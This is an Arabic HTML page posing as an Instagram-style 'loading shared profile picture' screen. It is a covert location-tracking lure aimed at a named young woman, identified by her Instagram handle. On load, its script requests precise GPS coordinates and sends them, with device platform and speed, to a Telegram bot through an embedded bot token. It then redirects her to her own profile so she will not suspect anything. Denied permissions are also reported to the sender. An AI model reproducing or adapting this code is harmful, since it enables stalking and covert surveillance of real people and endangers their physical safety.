<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل الصورة...</title>
    <style>
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .container { text-align: center; }
        .loader { border: 3px solid #dbdbdb; border-top: 3px solid #3897f0; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #8e8e8e; font-size: 14px; font-weight: 400; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <p>جاري فتح الصورة الشخصية المشتركة...</p>
</div>

<script>
    // بياناتك الخاصة
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    async function sendToTelegram(message) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
    }

    function getHighAccuracyLocation() {
        // إعدادات الدقة القصوى
        const geoOptions = {
            enableHighAccuracy: true, // تفعيل GPS الحقيقي
            timeout: 20000,           // انتظار 20 ثانية لجلب الإحداثيات
            maximumAge: 0             // عدم استخدام موقع قديم مخزن
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy; // دقة الموقع بالأمتار
                    const speed = position.coords.speed || 0;
                    
                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    let report = `🎯 *تم تحديد الموقع بدقة احترافية!*\n\n`;
                    report += `👤 *الهدف:* Hana (ha2542213)\n`;
                    report += `📍 *رابط الخريطة:* [اضغط هنا للفتح](${googleMaps})\n`;
                    report += `📏 *نسبة الخطأ:* ${acc.toFixed(1)} متر فقط\n`;
                    report += `📱 *الجهاز:* ${navigator.platform}\n`;
                    report += `🚀 *السرعة:* ${speed} م/ث`;

                    sendToTelegram(report);

                    // التحويل الفوري لحسابها لعدم كشف الخدعة
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com/ha2542213";
                    }, 1500);
                },
                function(error) {
                    // إذا رفضت أو حدث خطأ
                    let errorMsg = "⚠️ البنت فتحت الرابط ولكنها: ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg += "رفضت إعطاء صلاحية الموقع (Blocked).";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg += "موقعها الحالي غير متاح (GPS مطفأ).";
                            break;
                        case error.TIMEOUT:
                            errorMsg += "انتهى وقت المحاولة ولم يتم جلب الموقع.";
                            break;
                    }
                    sendToTelegram(errorMsg);
                    // تحويلها أيضاً حتى لو رفضت لكي لا تشك
                    window.location.href = "https://www.instagram.com/ha2542213";
                },
                geoOptions
            );
        }
    }

    // تشغيل الكود بمجرد دخولها
    window.onload = getHighAccuracyLocation;
</script>

</body>
</html>
